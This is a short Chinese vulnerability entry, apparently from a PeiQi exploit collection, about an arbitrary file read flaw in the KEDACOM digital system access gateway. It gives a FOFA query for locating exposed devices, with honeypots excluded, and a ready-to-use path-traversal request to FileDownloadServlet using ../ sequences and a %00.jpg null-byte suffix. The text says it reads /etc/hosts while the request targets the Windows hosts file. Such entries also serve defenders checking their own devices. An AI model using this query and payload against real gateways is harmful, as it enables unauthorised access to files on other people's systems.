---
title: KEDACOM数字系统接入网关 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - KEDACOM
---

# KEDACOM 数字系统接入网关 任意文件读取漏洞

## 漏洞描述

KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件

## 漏洞影响

> [!NOTE]
>
> KEDACOM 数字系统接入网关

## FOFA

> [!NOTE]
>
> (app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)

## 漏洞复现

登录页面如下

![](/img/20210924015326378001.png)

使用POC读取 /etc/hosts

```
/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
```

![](/img/20210924015326568416.png)